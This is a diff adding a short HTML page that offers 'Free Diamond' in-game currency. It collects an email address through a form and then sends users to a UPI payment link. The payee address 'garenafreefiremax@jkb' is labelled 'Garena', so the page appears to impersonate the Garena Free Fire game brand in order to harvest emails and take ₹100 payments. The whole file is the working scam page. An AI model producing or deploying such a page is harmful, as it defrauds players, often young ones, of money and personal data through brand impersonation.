@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Diamond</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+  <h2>Bind Your Email </h2>
+
+  <form action="process.php" method="post">
+    <input type="hidden" name="type" value="diamond">
+
+    <input type="email" name="email" placeholder="Enter Email" required>
+
+    <button type="submit">Continue</button>
+  </form>
+
+  <div class="offer">
+    <p>🎁 5000 Diamonds</p>
+    <button onclick="pay()">₹100</button>
+  </div>
+</div>
+
+<script>
+function pay(){
+  window.location.href =
+   "upi://pay?pa=garenafreefiremax@jkb&pn=Garena&am=100&cu=INR&tn=Diamond";
+}
+</script>
+
+</body>
+</html>
